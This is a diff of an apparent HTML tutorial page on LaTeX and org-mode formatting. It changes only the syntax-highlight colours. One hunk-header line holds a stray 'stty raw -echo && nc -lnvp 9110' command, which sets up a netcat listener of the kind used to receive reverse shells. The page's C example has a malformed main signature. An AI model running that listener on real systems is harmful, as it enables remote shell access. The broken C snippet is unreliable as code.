-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\begin&lt;/span&gt;{lstlisting}
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\\&lt;/span&gt; Generates A Line Break
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\hfill&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;\break&lt;/span&gt; Another Way of Generating
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\newline&lt;/span&gt; A Third Way
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\end&lt;/span&gt;{lstlisting}
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\begin&lt;/span&gt;{lstlisting}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\\&lt;/span&gt; Generates A Line Break
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\hfill&lt;/span&gt; &lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\break&lt;/span&gt; Another Way of Generating
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\newline&lt;/span&gt; A Third Way
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\end&lt;/span&gt;{lstlisting}
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;page-breaks&#34; &gt;Page Breaks
 &lt;span&gt;
     &lt;a href=&#34;#page-breaks&#34;&gt;
@@ -195,8 +422,8 @@
     &lt;/a&gt;
 &lt;/span&gt;
 &lt;/h4&gt;&lt;p&gt;To do a page break, there are two ways to do so.&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\clearpage&lt;/span&gt; which puts on a new page
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\newpage&lt;/span&gt; which does the same thing
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\clearpage&lt;/span&gt; which puts on a new page
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\newpage&lt;/span&gt; which does the same thing
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;horizontal-blank-spaces&#34; &gt;Horizontal Blank Spaces
 &lt;span&gt;
     &lt;a href=&#34;#horizontal-blank-spaces&#34;&gt;
@@ -204,11 +431,11 @@
     &lt;/a&gt;
 &lt;/span&gt;
 &lt;/h4&gt;&lt;p&gt;Horizontal spaces of arbitrary length may be inserted with.&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\hspace&lt;/span&gt;{size_value} inserts a horizontal blank spaces
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\hfill&lt;/span&gt; insert a blank space will stretch accordingly to fill the space available.
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\hspace&lt;/span&gt;{size_value} inserts a horizontal blank spaces
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\hfill&lt;/span&gt; insert a blank space will stretch accordingly to fill the space available.
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Something Similar to hfill
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\hrulefill&lt;/span&gt; which insert blank spaces as horizontal ruler
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\dotfill&lt;/span&gt; inserts blank spaces of dots
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\hrulefill&lt;/span&gt; which insert blank spaces as horizontal ruler
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\dotfill&lt;/span&gt; inserts blank spaces of dots
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;==&amp;gt; view the example below
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;vertical-blank-spaces&#34; &gt;Vertical Blank Spaces
 &lt;span&gt;
@@ -217,12 +444,12 @@
     &lt;/a&gt;
 &lt;/span&gt;
 &lt;/h4&gt;&lt;p&gt;Vertical blank spaces have the same syntax as horizontal ones.&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\vspace&lt;/span&gt;{size_value} inserts a vertical spaces according to specified length.
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\vfill&lt;/span&gt; insert a blank space that stretch accordingly to fill the vertical space available.
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\vspace&lt;/span&gt;{size_value} inserts a vertical spaces according to specified length.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\vfill&lt;/span&gt; insert a blank space that stretch accordingly to fill the vertical space available.
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;something Similar To Insert blank vertical space
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\smallskip&lt;/span&gt; adds 3pt space plus or minus 1 (depends on document type,space available)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\medskip&lt;/span&gt; adds 6pt space plus or minus 2 (depends on document type,space available)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\bigskip&lt;/span&gt; adds 12pt space plus or minus 4 (depends on document type,space available)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\smallskip&lt;/span&gt; adds 3pt space plus or minus 1 (depends on document type,space available)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\medskip&lt;/span&gt; adds 6pt space plus or minus 2 (depends on document type,space available)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\bigskip&lt;/span&gt; adds 12pt space plus or minus 4 (depends on document type,space available)
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;==&amp;gt; view the example below
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;additional-line-breaking&#34; &gt;Additional Line Breaking
 &lt;span&gt;
@@ -230,9 +457,9 @@
         &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
     &lt;/a&gt;
 &lt;/span&gt;
-&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\\*&lt;/span&gt; breaks the line at the point of the command and additionally prohibits a page break after the forced line break.
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\break&lt;/span&gt; breaks the line without filling the current line. This will result in very bad formatting if you do not fill the line yourself.
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\linebreak&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;[number]&lt;/span&gt;
+&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\\*&lt;/span&gt; breaks the line at the point of the command and additionally prohibits a page break after the forced line break.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\break&lt;/span&gt; breaks the line without filling the current line. This will result in very bad formatting if you do not fill the line yourself.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\linebreak&lt;/span&gt;&lt;span style=&#34;color:#ff0086;font-weight:bold&#34;&gt;[number]&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;It breaks the line at the point of the command. The number provided as an argument represents the priority of the command in a range of 0 to 4. (0 means it will be easily ignored and 4 means do it anyway). When this line break option is used, LaTeX will try to produce the best line breaks possible.
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;lengths-and-units&#34; &gt;Lengths and units
 &lt;span&gt;
@@ -296,7 +523,7 @@
     &lt;/a&gt;
 &lt;/span&gt;
 &lt;/h4&gt;&lt;p&gt;Lengths are units of distance relative to some document elements. Lengths can be changed by the command:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\setlength&lt;/span&gt;{&lt;span style=&#34;color:#66d9ef&#34;&gt;\lengthname&lt;/span&gt;}{value_in_specified_unit}
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\setlength&lt;/span&gt;{&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\lengthname&lt;/span&gt;}{value_in_specified_unit}
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Below is a table with some of the most common lengths and their description.&lt;/p&gt;
 &lt;table&gt;
 &lt;thead&gt;
@@ -383,8 +610,8 @@
         &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
     &lt;/a&gt;
 &lt;/span&gt;
-&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt; † ‡ • … ‰ ‱ ‹ › ※ ‽ ⁄ ⁎ ⁒ ₡ ₤ ₦ ₩ ₫ € ₱ ℃ № ℗ ℞ ℠ ™ Ω ℧ ℮ ← ↑ → ↓ 〈 〉 ␢ ␣ ◦ ◯ ♪ ⟨ ⟩ Ḡ ḡ &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&amp;lt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&amp;gt; &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &amp;gt;&amp;gt; $ %&amp;amp;&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; ↗ ↛ ? ?? ffi !? ¿ ?! ¡ !! ⸨ ⸩ ′′′′ « » ⸙ ~ -&amp;gt; &amp;lt;-
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{ † ‡ • … ‰ ‱ ‹ › ※ ‽ ⁄ ⁎ ⁒ ₡ ₤ ₦ ₩ ₫ € ₱ ℃ № ℗ ℞ ℠ ™ Ω ℧ ℮ ← ↑ → ↓ 〈 〉 ␢ ␣ ◦ ◯ ♪ ⟨ ⟩ Ḡ ḡ }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&amp;lt; =&amp;gt; ==&amp;gt; &amp;lt;= &amp;lt;== &amp;gt;&amp;gt; $ %&amp;amp;() ↗ ↛ ? ?? ffi !? ¿ ?! ¡ !! ⸨ ⸩ ′′′′ « » ⸙ ~ -&amp;gt; &amp;lt;-
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;chat-block&#34; &gt;Chat Block
 &lt;span&gt;
     &lt;a href=&#34;#chat-block&#34;&gt;
@@ -394,9 +621,9 @@
 &lt;/h3&gt;&lt;p&gt;Chat Box (Dialogue Type Like)
 Using snippet (&amp;quot;&amp;lt;ch&amp;quot;) inside of org-mode.
 as we can use any TeX Syntax inside of chat block&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;#+begin_chat
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\textcolor&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;[HTML]&lt;/span&gt;{008b8b}{Jone} This is a nice chat&lt;span style=&#34;color:#66d9ef&#34;&gt;\\&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\textcolor&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;[HTML]&lt;/span&gt;{b22222}{Maria} Yes Thank you
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;#+begin_chat
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\textcolor&lt;/span&gt;&lt;span style=&#34;color:#ff0086;font-weight:bold&#34;&gt;[HTML]&lt;/span&gt;{008b8b}{Jone} This is a nice chat&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\\&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\textcolor&lt;/span&gt;&lt;span style=&#34;color:#ff0086;font-weight:bold&#34;&gt;[HTML]&lt;/span&gt;{b22222}{Maria} Yes Thank you
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;#+end_chat
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;chat&#34;&gt;
 &lt;p&gt;\textcolor[HTML]{008b8b}{Jone} This is a nice chat&lt;br /&gt;
@@ -416,7 +643,7 @@ Can Be Set With LaTeX Attribute.
 &lt;li&gt;&lt;code&gt;\tcblower&lt;/code&gt; To be used for doing the lowerpart.&lt;/li&gt;
 &lt;/ul&gt;
 &lt;!--listend--&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;#+ATTR_LATEX: :title Custom Text Box
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;#+ATTR_LATEX: :title Custom Text Box
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;#+begin_ybox
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Lmfao This Text Box Sucks.
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;#+end_ybox
@@ -463,15 +690,15 @@ what stty raw -echo &amp;amp;&amp;amp; nc -lnvp 9110&lt;/p&gt;
         &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
     &lt;/a&gt;
 &lt;/span&gt;
-&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;#+begin_src &amp;lt;language&amp;gt; &amp;lt;options&amp;gt;
+&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;#+begin_src &amp;lt;language&amp;gt; &amp;lt;options&amp;gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Refer to org-mode source blocks for a detailed manual.
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;#+end_src
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Code Highlights in LaTeX is being done automatically using engraved backend &lt;a href=&#34;https://github.com/tecosaur/engrave-faces/&#34;&gt;Engrave-Faces&lt;/a&gt;&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(argc a&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;) {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Hello World&amp;#34;&lt;/span&gt;);
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic&#34;&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cdcaa9;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#ff0086;font-weight:bold&#34;&gt;main&lt;/span&gt;(argc a**) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ff0086;font-weight:bold&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;Hello World&amp;#34;&lt;/span&gt;);
